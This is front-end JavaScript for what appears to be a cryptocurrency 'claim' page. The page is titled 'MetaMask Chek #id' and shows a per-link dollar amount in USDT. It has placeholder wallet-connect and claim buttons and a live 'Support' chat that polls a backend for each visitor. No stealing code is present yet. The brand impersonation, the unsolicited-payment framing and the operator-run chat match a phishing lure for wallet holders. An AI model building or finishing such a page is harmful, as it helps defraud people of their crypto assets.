const params = new URLSearchParams(window.location.search);
const linkId = params.get("id");

// Elements for dynamic check info
const checkTitleEl = document.getElementById("checkTitle");
const amountEl = document.getElementById("amount");
const currencyEl = document.getElementById("currency");

// Buttons
const btnConnect = document.getElementById("btnConnect");
const btnClaim = document.getElementById("btnClaim");

// Mobile burger
const burgerBtn = document.getElementById("burgerBtn");
const mobileMenu = document.getElementById("mobileMenu");

// Chat UI
const chatFab = document.getElementById("chatFab");
const chatPanel = document.getElementById("chatPanel");
const chatClose = document.getElementById("chatClose");
const chatMessages = document.getElementById("chatMessages");
const chatMsg = document.getElementById("chatMsg");
const chatSend = document.getElementById("chatSend");

// Dummy actions
btnConnect?.addEventListener("click", () => {
  alert("Wallet connect modal later (dummy for now).");
});
btnClaim?.addEventListener("click", () => {
  alert("Claim flow later (dummy for now).");
});

// Mobile dropdown menu toggle
function setMenu(open) {
  if (!mobileMenu || !burgerBtn) return;
  if (open) {
    mobileMenu.classList.add("open");
    mobileMenu.setAttribute("aria-hidden", "false");
    burgerBtn.setAttribute("aria-expanded", "true");
  } else {
    mobileMenu.classList.remove("open");
    mobileMenu.setAttribute("aria-hidden", "true");
    burgerBtn.setAttribute("aria-expanded", "false");
  }
}
burgerBtn?.addEventListener("click", () => {
  const isOpen = mobileMenu?.classList.contains("open");
  setMenu(!isOpen);
});
document.addEventListener("click", (e) => {
  if (!mobileMenu || !burgerBtn) return;
  if (!mobileMenu.classList.contains("open")) return;
  const target = e.target;
  if (mobileMenu.contains(target) || burgerBtn.contains(target)) return;
  setMenu(false);
});

// Load link data
fetch(`/api/link?id=${encodeURIComponent(linkId || "")}`)
  .then(r => r.json())
  .then(data => {
    if (!data.ok) {
      document.body.innerHTML = "Link not found";
      return;
    }

    // Title: MetaMask Chek #<id>
    checkTitleEl.textContent = `MetaMask Chek #${data.id}`;

    // Amount: $1,250
    const num = Number(data.amount);
    const formatted = Number.isFinite(num)
      ? new Intl.NumberFormat("en-US").format(num)
      : String(data.amount);

    amountEl.textContent = `$${formatted}`;

    // currency: USDT
    currencyEl.textContent = `currency: ${String(data.currency).toUpperCase()}`;
  })
  .catch(() => {
    document.body.innerHTML = "Link not found";
  });

/* ===== Support chat (same behavior as before) ===== */

// Thread id per visitor per link
let threadId = localStorage.getItem("greenland_thread_" + linkId);
if (!threadId) {
  threadId = Math.random().toString(36).slice(2, 10);
  localStorage.setItem("greenland_thread_" + linkId, threadId);
}

// Open/close support panel
function openChat() {
  chatPanel.classList.add("open");
  chatPanel.setAttribute("aria-hidden", "false");
  chatMsg?.focus();
}
function closeChat() {
  chatPanel.classList.remove("open");
  chatPanel.setAttribute("aria-hidden", "true");
}
chatFab?.addEventListener("click", openChat);
chatClose?.addEventListener("click", closeChat);

// Render messages
function render(messages) {
  const lines = (messages || []).map(m => {
    const who = m.from === "visitor" ? "You" : "Support";
    const time = new Date(m.ts).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
    return `[${time}] ${who}: ${m.text}`;
  });
  chatMessages.textContent = lines.join("\n");
  chatMessages.scrollTop = chatMessages.scrollHeight;
}

// Poll messages
function poll() {
  fetch(`/api/support/poll?linkId=${encodeURIComponent(linkId || "")}&threadId=${encodeURIComponent(threadId)}`)
    .then(r => r.json())
    .then(d => { if (d.ok) render(d.messages || []); })
    .catch(() => {})
    .finally(() => setTimeout(poll, 1500));
}
poll();

// Send message
function send() {
  const text = chatMsg.value.trim();
  if (!text) return;
  chatMsg.value = "";

  fetch("/api/support/send", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ linkId, threadId, text })
  }).catch(() => {});
}
chatSend?.addEventListener("click", send);
chatMsg?.addEventListener("keydown", (e) => {
  if (e.key === "Enter") send();
});
